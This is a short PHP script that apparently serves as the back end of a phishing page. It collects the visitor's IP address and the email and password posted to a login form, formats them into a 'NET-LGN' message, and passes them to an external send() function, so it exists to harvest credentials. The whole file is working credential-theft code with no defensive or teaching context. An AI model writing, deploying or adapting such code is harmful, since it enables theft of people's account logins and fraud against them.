<?php
ini_set('display_errors', 1); 
error_reporting(E_ALL);
require_once('../function.php');
if(isset($_POST)){
	$ip = $_SERVER['REMOTE_ADDR'];
	$msg="🔥𝘕𝘌𝘛-𝘓𝘎𝘕 ".$ip."\n";
	$msg.='┌── '.$_POST['email']."\n";
	$msg.='└─╼╼ '.$_POST['pass']."\n";
    send($msg);
}
?>